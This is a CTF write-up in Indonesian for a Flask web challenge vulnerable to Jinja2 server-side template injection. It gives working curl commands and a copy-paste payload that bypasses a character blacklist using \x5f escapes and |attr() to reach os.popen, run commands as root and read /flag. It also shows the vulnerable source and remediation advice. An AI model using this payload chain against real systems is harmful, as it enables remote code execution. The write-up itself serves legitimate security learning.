# Writeup — Pabrik Lembaran

| | |
|---|---|
| **Challenge** | Pabrik Lembaran |
| **Kategori** | Web Exploitation — Server-Side Template Injection (SSTI) |
| **Poin** | 750 |
| **Event** | TechtonicExpo CTF |
| **Kode Tim** | D35D4ECD |
| **Service** | `http://168.110.219.59:5010/` |
| **Flag** | `TechtonicExpoCTF{cetak_dari_dalam_D35D4ECD}` |

---

## Deskripsi

> Pabrik Lembaran memproduksi satu hal: kalimat sambutan dari namamu. Masukkan nama, dapatkan lembaran.
>
> Tapi mesin cetaknya membuka namamu dan menuliskannya langsung ke dalam cetakan tanpa berpikir dua kali. Beberapa karakter yang sering dipakai untuk mengecoh sudah dihapus, seolah-olah penghapusan kecil itu membuat semuanya aman.
>
> Yang tidak disadari pabrik: di gudang belakang ada sebuah berkas yang berisi sesuatu yang berharga.
>
> **Catatan teknisi:** Mesin tidak suka titik (`.`), garis bawah (`_`), dan kurung siku (`[` `]`). Ia membuang karakter-karakter itu dari setiap nama sebelum mencetak.

Terjemahan bebas: input nama ditulis **langsung ke dalam template** tanpa sanitasi yang benar (hanya beberapa karakter dibuang) → indikasi kuat **SSTI**. "Berkas di gudang belakang" = file yang harus dibaca lewat eksploitasi.

---

## 1. Reconnaissance

Ambil halaman utama:

```bash
curl -s -i http://168.110.219.59:5010/
```

Temuan penting:

```
Server: Werkzeug/3.1.8 Python/3.12.14
...
<form method="get" action="/sapa"><input name="nama" ...>
```

- Backend **Flask/Werkzeug (Python 3.12)** → kandidat kuat template engine **Jinja2**.
- Input dikirim via `GET /sapa?nama=...`.

---

## 2. Konfirmasi Kerentanan

| Payload (`nama=`) | Output "Halo, ..." | Arti |
|---|---|---|
| `{{7*7}}` | `49` | Template dievaluasi → **SSTI** |
| `{{7*'7'}}` | `7777777` | Perkalian string ala Python → **Jinja2** |
| `{{'\x5f\x5f'}}` | `__` | Escape `\x5f` diproses Jinja2 → **bypass filter berhasil** |

```bash
curl -s "http://168.110.219.59:5010/sapa" --get --data-urlencode "nama={{7*7}}"
# ...<p>Halo, 49. Selamat datang di pabrik.</p>...
```

---

## 3. Analisis Filter & Strategi Bypass

Filter membuang `.` `_` `[` `]` — tepat karakter inti eksploitasi Python:

| Butuh | Diblok | Ganti dengan |
|---|---|---|
| Akses atribut `obj.attr` / subscript `obj[x]` | `.` `[` `]` | filter Jinja2 **`\|attr('nama')`** |
| Dunder `__globals__`, dst. | `_` | escape **`\x5f`** (Jinja2 → `_`) |
| Titik di dalam path/nama file | `.` | escape **`\x2e`** (Jinja2 → `.`) atau pakai glob `*` |

**Kenapa lolos?** `\x5f` secara literal adalah karakter `\ x 5 f` — tidak mengandung `_`, jadi lolos `saring()`. Baru saat Jinja2 mem-parsing string literal, `\x5f` diubah menjadi `_`.

---

## 4. Exploitation

### 4a. Enumerasi globals

`lipsum` (fungsi bawaan Jinja2/Flask) punya `__globals__` yang memuat modul `os`:

```bash
curl -s "http://168.110.219.59:5010/sapa" --get \
  --data-urlencode "nama={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('keys')()|list}}"
```

```
[... '__builtins__', 'enum', 'json', 'os', 're', ... 'generate_lorem_ipsum', ...]
```

→ `os` tersedia. Rangkaian yang setara dengan `lipsum.__globals__['os'].popen(cmd).read()`:

```
lipsum
  |attr('\x5f\x5fglobals\x5f\x5f')   # .__globals__
  |attr('get')('os')                 # ['os']  (pakai dict.get, hindari [])
  |attr('popen')(CMD)                # .popen(CMD)
  |attr('read')()                    # .read()
```

### 4b. Remote Code Execution

```bash
curl -s "http://168.110.219.59:5010/sapa" --get \
  --data-urlencode "nama={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('id')|attr('read')()}}"
```

```
Halo, uid=0(root) gid=0(root) groups=0(root). Selamat datang di pabrik.
```

**RCE sebagai root.** ✅

### 4c. Mencari & membaca flag

```bash
# ls -la /
... -rw-r--r-- 1 root root 17 Aug 18 17:47 flag
```

File `/flag` ditemukan (tanpa `.`/`_`/`[`/`]` di path, jadi aman dikirim langsung):

```bash
curl -s "http://168.110.219.59:5010/sapa" --get \
  --data-urlencode "nama={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('cat /flag')|attr('read')()}}"
```

```
Halo, cetak_dari_dalam. Selamat datang di pabrik.
```

> Catatan: membaca `/srv/app.py` **gagal** kalau ditulis apa adanya karena `.py` kena filter (jadi `apppy`). Solusinya pakai glob (`cat /srv/app*`) atau escape (`cat /srv/app\x2epy`).

---

## 5. Root Cause (dari `/srv/app.py`)

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

def saring(s):
    return s.replace(".", "").replace("_", "").replace("[", "").replace("]", "")

@app.route("/sapa")
def sapa():
    nama = saring(request.args.get("nama", ""))
    ...
    hasil = render_template_string("Halo, " + nama + " ...")   # <-- input digabung ke template
```

Dua kesalahan fatal:
1. **Input user digabung langsung** ke string template lalu diproses `render_template_string()` → SSTI klasik.
2. **Blacklist karakter** (`saring`) bukan pertahanan yang memadai — mudah dilewati dengan escape (`\x5f`, `\x2e`) dan filter `|attr()`.

---

## 6. Flag

Isi `/flag` adalah kunci: `cetak_dari_dalam`. Sesuai format soal `TechtonicExpoCTF{kunci_KODETIM}` dengan kode tim `D35D4ECD`:

```
TechtonicExpoCTF{cetak_dari_dalam_D35D4ECD}
```

---

## 7. Payload Final (copy-paste ke field `nama`)

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('cat /flag')|attr('read')()}}
```

---

## 8. Remediation

- Jangan pernah menggabungkan input user ke `render_template_string()`. Pakai template statis + context variables: `render_template_string("Halo, {{ nama }}", nama=nama)`.
- Kalau memang harus render dinamis, gunakan **sandboxed environment** Jinja2 (`SandboxedEnvironment`) — walau tetap tidak dianjurkan.
- Jangan andalkan **blacklist karakter**; gunakan escaping/encoding yang benar dan perlakukan input sebagai data, bukan kode.
```

---
*Writeup dibuat untuk TechtonicExpo CTF — kategori Web / SSTI.*
